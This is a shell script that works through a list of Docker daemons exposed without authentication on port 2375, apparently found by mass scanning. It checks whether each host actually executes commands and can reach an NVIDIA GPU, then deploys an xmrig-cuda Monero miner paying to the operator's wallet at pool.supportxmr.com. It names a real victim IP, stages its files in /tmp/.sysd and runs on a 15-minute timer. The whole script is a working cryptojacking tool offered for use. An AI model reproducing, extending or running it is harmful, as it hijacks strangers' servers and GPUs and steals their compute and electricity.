#!/bin/sh
# ============================================================================
# dockcls.sh - classify daemons by what they can actually DO for us.
#
# Two probes, both channel-free. Why: /logs and exec-start return EMPTY on this
# population, so nothing can be read out of a container - every question has to
# be answered by an API side effect instead.
#
#   exec  create a container whose Cmd is `sh -c "exit 7"`, start it, read
#         State.ExitCode. 7 = this host really executes commands. ExitCode 0 with
#         a null FinishedAt = it accepts everything and runs nothing
#         ("shell-only"). Measured exactly that shape on 134.209.121.89.
#
#   gpu   create a container with HostConfig.DeviceRequests driver=nvidia, which
#         is what `--gpus all` sends. The daemon validates it against its
#         registered runtimes, so a create returning an Id means a container here
#         CAN reach a GPU, and "could not select device driver" means it cannot.
#         Create-only = one call per host, so it scales to the whole known set.
#
# Why it matters: 59 endpoints placed, ~4-6 producing, 51 gone, 5,397 known
# daemons never attempted. If a slice of the population is shell-only then every
# deploy onto it is a fake deploy - which is what "placed 57, gained 0" is. And a
# GPU is worthless on a host that never runs a command, so exec comes first.
#
# usage: sh dockcls.sh [exec|gpu|deploy|all]      (timer: all, every 15 min)
# state: .hunt/dock.cls  "ip <TAB> class <TAB> epoch"; additive rows, re-checked
#        after CLS_REFRESH so a host is never written off permanently.
# ============================================================================
set -u
SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK" 2>/dev/null || :
CLS="$WORK/dock.cls"
IMG_CUDA="${CLS_IMAGE:-xmrig/xmrig-cuda}"
PAR="${CLS_PAR:-24}"
MAX_GPU="${CLS_GPU_MAX:-1200}"
MAX_EXEC="${CLS_EXEC_MAX:-120}"
MAX_DEPLOY="${CLS_DEPLOY_MAX:-3}"
REFRESH="${CLS_REFRESH:-604800}"
BUDGET="${CLS_BUDGET:-480}"
POOLHOST="${POOL:-pool.supportxmr.com:443}"
W="${WALLET:?set WALLET}"
MODE="${1:-all}"
touch "$CLS" 2>/dev/null || :
now=$(date +%s)
deadline=$((now + BUDGET))

note() { printf '%s\t%s\t%s\n' "$1" "$2" "$now" >> "$CLS"; }

# Old engines and API proxies 404 *unversioned dynamic* paths like /containers/create
# while /containers/json still answers - already a documented landmine in this kit.
# Without this, a whole slice of the population reads as gpu_err, which is wrong.
apibase() {
    v=$(curl -sS -m 4 "http://$1:2375/version" 2>/dev/null | grep -o '"ApiVersion":"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$v" ]; then PB="http://$1:2375/v$v"; else PB="http://$1:2375"; fi
}
iscanned() { printf %s "$1" | grep -q '^<html\|^<!DOCTYPE'; }

probe_exec() {
    ip=$1
    apibase "$ip"
    curl -sS -m 6 -X DELETE "$PB/containers/kwexec?force=1" >/dev/null 2>&1
    curl -sS -m 10 -X POST "$PB/containers/create?name=kwexec" \
        -H 'Content-Type: application/json' \
        -d '{"Image":"busybox:1.36","Cmd":["sh","-c","exit 7"]}' >/dev/null 2>&1
    curl -sS -m 8 -o /dev/null -X POST "$PB/containers/kwexec/start" 2>/dev/null
    sleep 9
    st=$(curl -sS -m 6 "$PB/containers/kwexec/json" 2>/dev/null)
    if iscanned "$st"; then note "$ip" canned_page; echo "  $ip CANNED(html)"; return; fi
    ec=$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1 | cut -d: -f2)
    fin=$(printf %s "$st" | grep -o '"FinishedAt":"[0-9]*' | head -1 | cut -d: -f2 | tr -d '"')
    if [ "$ec" = "7" ]; then note "$ip" exec_ok; echo "  $ip EXEC_OK"
    elif [ "$ec" = "0" ] && [ -z "$fin" ]; then note "$ip" shell_only; echo "  $ip SHELL_ONLY"
    elif [ -n "$ec" ]; then note "$ip" "exec_rc=$ec"; echo "  $ip exec_rc=$ec"
    else note "$ip" no_api; echo "  $ip no_api"; fi
    curl -sS -m 4 -X DELETE "$PB/containers/kwexec?force=1" >/dev/null 2>&1
}

probe_gpu() {
    ip=$1
    apibase "$ip"
    # the image has to exist locally or create is meaningless: a missing busybox
    # would read as "no GPU", a false negative. So pull once and retry.
    body='{"Image":"busybox:1.36","HostConfig":{"DeviceRequests":[{"Driver":"nvidia","Count":-1,"Capabilities":[["gpu"]]}]}}'
    curl -sS -m 6 -X DELETE "$PB/containers/kwgpuq?force=1" >/dev/null 2>&1
    r=$(curl -sS -m 12 -X POST "$PB/containers/create?name=kwgpuq" \
        -H 'Content-Type: application/json' -d "$body" 2>/dev/null)
    if printf %s "$r" | grep -qi 'no such image\|unable to find image'; then
        curl -sS -m 90 -X POST "$PB/images/create?fromImage=busybox&tag=1.36" >/dev/null 2>&1
        r=$(curl -sS -m 12 -X POST "$PB/containers/create?name=kwgpuq" \
            -H 'Content-Type: application/json' -d "$body" 2>/dev/null)
    fi
    if iscanned "$r"; then note "$ip" canned_page; echo "  $ip CANNED(html)"
    elif printf %s "$r" | grep -q '"Id"'; then note "$ip" gpu_ok; echo "  $ip GPU_OK"
    elif printf %s "$r" | grep -qi 'could not select device driver'; then note "$ip" gpu_no; echo "  $ip gpu_no"
    elif [ -z "$r" ]; then note "$ip" no_api; echo "  $ip no_api"
    else note "$ip" gpu_err; echo "  $ip gpu_err: $(printf %s "$r" | head -c 70)"; fi
    curl -sS -m 4 -X DELETE "$PB/containers/kwgpuq?force=1" >/dev/null 2>&1
}

deploy_gpu() {
    ip=$1
    lst=$(curl -sS -m 5 "http://$ip:2375/containers/json?all=1" 2>/dev/null)
    if printf %s "$lst" | grep -q '"kwgpu"'; then echo "  $ip kwgpu present"; return; fi
    curl -sS -m 300 -X POST "http://$ip:2375/images/create?fromImage=$IMG_CUDA" >/dev/null 2>&1
    b="{\"Image\":\"$IMG_CUDA\",\"Tty\":true,\"Cmd\":[\"-o\",\"$POOLHOST\",\"-u\",\"$W\",\"-p\",\"$ip\",\"-k\",\"--tls\",\"--donate-level\",\"1\"],\"HostConfig\":{\"DeviceRequests\":[{\"Driver\":\"nvidia\",\"Count\":-1,\"Capabilities\":[[\"gpu\"]]}]}}"
    r=$(curl -sS -m 40 -X POST "http://$ip:2375/containers/create?name=kwgpu" -H 'Content-Type: application/json' -d "$b" 2>/dev/null)
    cid=$(printf %s "$r" | grep -oE '[0-9a-f]{64}' | head -1)
    if [ -z "$cid" ]; then echo "  $ip kwgpu create failed: $(printf %s "$r" | head -c 80)"; return; fi
    c=$(curl -sS -m 25 -o /dev/null -w '%{http_code}' -X POST "http://$ip:2375/containers/$cid/start" 2>/dev/null)
    note "$ip" gpu_deployed
    echo "  $ip kwgpu deployed start=$c (pool worker id $ip)"
}

runlist() {
    f=$1; fn=$2; mx=$3; n=0
    while read -r ip; do
        [ -n "$ip" ] || continue
        [ "$(date +%s)" -lt "$deadline" ] || { echo "  (budget hit)"; break; }
        ( $fn "$ip" ) &
        n=$((n+1))
        [ $((n % PAR)) -eq 0 ] && wait
        [ "$n" -ge "$mx" ] && break
    done < "$f"
    wait
}

echo "dockcls: mode=$MODE par=$PAR refresh=${REFRESH}s budget=${BUDGET}s"
if [ "$MODE" = exec ] || [ "$MODE" = all ]; then
    echo "== exec probe: does sh -c actually run on this host?"
    { cut -f1 "$WORK/dock.owned" 2>/dev/null
      awk -F'\t' '$2 ~ /^gpu_ok/ {print $1}' "$CLS" 2>/dev/null; } \
        | grep -E '^[0-9]' | sort -u > "$WORK/cls.e1"
    awk -F'\t' '$2 ~ /^exec_/ || $2 ~ /^shell_only/ {print $1}' "$CLS" > "$WORK/cls.e2" 2>/dev/null
    sort -u "$WORK/cls.e2" > "$WORK/cls.e3"
    grep -vxF -f "$WORK/cls.e3" "$WORK/cls.e1" > "$WORK/cls.e4" 2>/dev/null || cp "$WORK/cls.e1" "$WORK/cls.e4"
    echo "  candidates=$(wc -l < "$WORK/cls.e4")"
    runlist "$WORK/cls.e4" probe_exec "$MAX_EXEC"
fi
if [ "$MODE" = gpu ] || [ "$MODE" = all ]; then
    echo "== gpu probe: can a container here reach a GPU? (create-only, whole known set)"
    cut -f1 "$WORK/mass.found" 2>/dev/null | grep -E '^[0-9]' | sort -u > "$WORK/cls.g1"
    awk -F'\t' '$2=="gpu_ok" || $2=="gpu_no" || $2=="canned_page" {print $1}' "$CLS" 2>/dev/null | sort -u > "$WORK/cls.g2"
    grep -vxF -f "$WORK/cls.g2" "$WORK/cls.g1" > "$WORK/cls.g3" 2>/dev/null || cp "$WORK/cls.g1" "$WORK/cls.g3"
    echo "  known=$(wc -l < "$WORK/cls.g1") unclassified=$(wc -l < "$WORK/cls.g3")"
    runlist "$WORK/cls.g3" probe_gpu "$MAX_GPU"
fi
if [ "$MODE" = deploy ] || [ "$MODE" = all ]; then
    echo "== gpu deploy (exec_ok AND gpu_ok only - the image pull is heavy)"
    awk -F'\t' '$2=="gpu_ok" {print $1}' "$CLS" 2>/dev/null | sort -u > "$WORK/cls.d1"
    awk -F'\t' '$2=="exec_ok" {print $1}' "$CLS" 2>/dev/null | sort -u > "$WORK/cls.d2"
    comm -12 "$WORK/cls.d1" "$WORK/cls.d2" > "$WORK/cls.d3"
    grep gpu_deployed "$CLS" 2>/dev/null | cut -f1 | sort -u > "$WORK/cls.d4"
    grep -vxF -f "$WORK/cls.d4" "$WORK/cls.d3" > "$WORK/cls.d5" 2>/dev/null || cp "$WORK/cls.d3" "$WORK/cls.d5"
    echo "  already_deployed=$(wc -l < "$WORK/cls.d4") eligible=$(wc -l < "$WORK/cls.d5")"
    runlist "$WORK/cls.d5" deploy_gpu "$MAX_DEPLOY"
fi
echo "== classification so far"
cut -f2 "$CLS" | sort | uniq -c | sort -rn | head -12
date -u
